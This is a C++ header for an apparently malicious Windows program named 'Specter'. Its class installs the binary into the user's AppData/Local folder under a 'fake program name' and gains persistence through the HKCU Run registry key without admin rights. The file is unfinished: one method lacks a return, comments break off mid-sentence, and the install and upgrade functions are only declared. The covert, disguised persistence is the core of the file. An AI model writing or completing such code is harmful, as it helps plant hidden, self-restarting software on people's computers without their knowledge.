#pragma once
#include <filesystem>
#include <string>

#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#include "SpecterLib/CommonPaths.hpp"
#include "SpecterLib/SyscallException.hpp"

// TODO what happens if the targetFileName isn't the one already installed? Need to flesh out the edge cases...

// This class is responsible for deploying the Specter binary into the machine without any admin privileges
// Deploy to the AppData/Local folder, and ensures persistence by using the HKCU persistence method and 
class SpecterUnprivilegedDeployment
{
	static constexpr HKEY kTargetRegistryRoot = HKEY_CURRENT_USER;
	static inline const std::wstring kTargetRegistry = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

	const std::string m_fakeProgramName;
	const std::filesystem::path m_target_file;

public:
	SpecterUnprivilegedDeployment(std::string fake_program_name, const std::string& target_file_name) :
		m_fakeProgramName(std::move(fake_program_name)),
		m_target_file(CommonPaths::GetLocalPath() / target_file_name)
	{
	}

	bool IsInstalled() const
	{
		HKEY result;

		if (ERROR_SUCCESS != RegOpenKeyW(kTargetRegistryRoot, kTargetRegistry.c_str(), &result))
		{
			throw SyscallException(L"Failed to open the registry key: " + kTargetRegistry);
		}


		// If the key does indeed eixst, then we check if the file exists, if not, it's not installed at all, and needs repairing
		//   Repairing will be a separate function that we simply overwrite the target 

		// If the key does exist, and the file exists, we check if we ShouldUpgrade

		// If we ShouldUpgrade, we simply 
	}

	static bool ShouldUpgrade();

	static bool Install();
};
